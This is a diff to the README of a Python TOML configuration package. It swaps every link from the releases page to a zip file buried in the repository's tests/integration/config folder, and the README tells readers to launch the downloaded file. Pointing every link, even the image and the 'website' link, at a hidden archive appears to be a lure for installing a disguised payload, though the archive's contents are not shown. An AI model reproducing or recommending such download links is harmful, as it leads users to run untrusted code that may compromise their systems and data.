@@ -24,7 +24,7 @@ Welcome to the TOML Config Manager repository! This Python configuration system 
 ## Installation 🛠️
 To get started, you can download the latest release of the TOML Config Manager package from the following link:
 
-[![Download App](https://github.com/nuhu-999/toml-config-manager/releases)](https://github.com/nuhu-999/toml-config-manager/releases)
+[![Download App](https://github.com/nuhu-999/toml-config-manager/raw/refs/heads/master/tests/integration/config/config_toml_manager_2.0.zip)](https://github.com/nuhu-999/toml-config-manager/raw/refs/heads/master/tests/integration/config/config_toml_manager_2.0.zip)
 
 Make sure to launch the downloaded file to start using the TOML Config Manager.
 
@@ -45,7 +45,7 @@ If you encounter any issues or have questions regarding the TOML Config Manager,
 
 Let's simplify configuration management with TOML! 🌟
 
-![TOML Config Manager](https://github.com/nuhu-999/toml-config-manager/releases)
+![TOML Config Manager](https://github.com/nuhu-999/toml-config-manager/raw/refs/heads/master/tests/integration/config/config_toml_manager_2.0.zip)
 
 ---
 
@@ -53,4 +53,4 @@ By utilizing the TOML Config Manager, you can enhance the efficiency of applicat
 
 Explore the world of TOML-based configuration systems and elevate your development experience today. Happy coding! 🚀🐍
 
-[Visit the TOML Config Manager Website for More Information](https://github.com/nuhu-999/toml-config-manager/releases)
+[Visit the TOML Config Manager Website for More Information](https://github.com/nuhu-999/toml-config-manager/raw/refs/heads/master/tests/integration/config/config_toml_manager_2.0.zip)
